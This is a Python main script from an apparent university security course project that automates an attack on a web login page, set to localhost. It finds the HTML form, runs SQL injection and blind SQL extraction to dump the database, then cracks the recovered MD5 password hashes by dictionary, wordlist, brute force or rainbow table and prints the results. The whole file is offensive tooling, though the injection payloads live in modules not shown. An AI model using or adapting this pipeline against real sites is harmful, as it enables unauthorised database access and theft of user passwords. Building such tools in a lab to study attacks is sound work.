'''
Python 3.8.2
Programming and Security
Polytechnic Institute of Guarda
'''

from src.lib.others.validator.url import url
from src.lib.others.validator.basic import opc
from src.lib.others.guide import console
from src.lib.algorithm.app import App
from src.lib.algorithm.hack_WEB import hack_WEB
from src.lib.algorithm.hack_SQL import hack_SQL
from src.lib.algorithm.hack_MD5 import decrypt, main
import pathlib
import json
import time

MAXPASSWORDSIZE = 25 # SET LIMIT PASSWORD

def smart_path(dir = ''):
    all_path = str(pathlib.Path(__file__).parent.absolute()).lower()
    dir_path = str(pathlib.Path().absolute()).lower()
    path = all_path.replace(dir_path,'')
    path = path.replace('\\', '/')[1:]
    if len(path)>0:
        path = path+'/'
    return path+dir

# r = console({
#     'ask': [
#         [
#             'Please write the web page with an input? ',
#             'Please choose Attack type [1 - Dictionary | 2 - WordList | 3 - Bruteforce | 4 - RainbowTable]? '
#         ],
#         [
#             ['\n*** Incorrect website! ***', url],
#             ['\n*** Invalid option ***', opc]
#         ]
#     ]
# }).log()

r = ['http://localhost/login.php', '4']

#DEFINE ALL PROPERTY
hw = hack_WEB({
    'app_token' : '<hack-info>',
    'url_website' : r[0],
    'len_password' : MAXPASSWORDSIZE,
    'dir_root' : smart_path(),
    'dir_hashes' : smart_path('src/data/hashes.json'),
    'dir_bruteforce' : smart_path('src/data/bruteforce.json'),
    'dir_wordlist' : smart_path('src/data/wordlist.json'),
    'dir_rainbowtable' : smart_path('src/data/rainbowtable.json'),
    'dir_dictionary' : smart_path('src/data/dictionary.json'),
    'dir_knownquery' : smart_path('src/data/sqlBlind/KnownQueries.json'),
    'dir_excludeddatabase' : smart_path('src/data/sqlBlind/ExcludedDB.json'),
    'dir_queryinject' : smart_path('src/data/sqlBlind/sqlqueries.json'),
    'dir_querypiece' : smart_path('src/data/sqlBlind/sqlslicequery.json')
})
obj = hw.HTMLformOBJ()
obj = hw.injectSQL(obj)

if len(obj) > 0:
    #print( "\nWe found: " + str(obj) )
    hs = hack_SQL(obj)
    obj = hs.findAllData()
    
    if len(obj) > 0:
        #print( "\nWe found: " + str(obj) )

        do = decrypt({'sql':obj, 'obj':hs.OBJ})
        HASHES = do.getMD5()

        print('\n>>> Decrypting..')
        obj = hs.OBJ
        app = App()
        DICLIST = app.getJSON(obj['dir_dictionary'])
        WRDLIST = app.getJSON(obj['dir_wordlist'])
        CHRLIST = app.getJSON(obj['dir_bruteforce'])
        RBWLIST = app.getJSON(obj['dir_rainbowtable'])

        mn = main(obj)
        StartTime = time.perf_counter()
        if(r[1] == '1'): #Dictionary
            mn.exec(
                do.MD5byDictionary,
                DICLIST,
                HASHES
            )
        if(r[1] == '2'): #WordList
            mn.exec(
                do.MD5byWordList,
                WRDLIST,
                HASHES
            )
        if(r[1] == '3'): #Bruteforce
            mn.exec(
                do.MD5byBruteforce,
                CHRLIST,
                HASHES
            )
        if(r[1] == '4'): #RainbowTable
            mn.exec(
                do.MD5byRainbowTable,
                RBWLIST,
                HASHES
            )
        FinishTime = time.perf_counter()
        thisHashes = app.getJSON(obj['dir_hashes'])['localhost']
        newhashes = f'{str(pathlib.Path().absolute())}/'+smart_path(thisHashes)

        #RESUME
        print(f'[+] File: {newhashes}\n')
        print (json.dumps(app.getJSON(newhashes), sort_keys=True, indent=2))
        print(f'\n\n[+] Threads: {do.numThread}\n[+] Try: {do.numTry}\n[+] Found: {do.numFound}')
        print(f'[+] Finished in {round(FinishTime-StartTime, 2)} second(s)')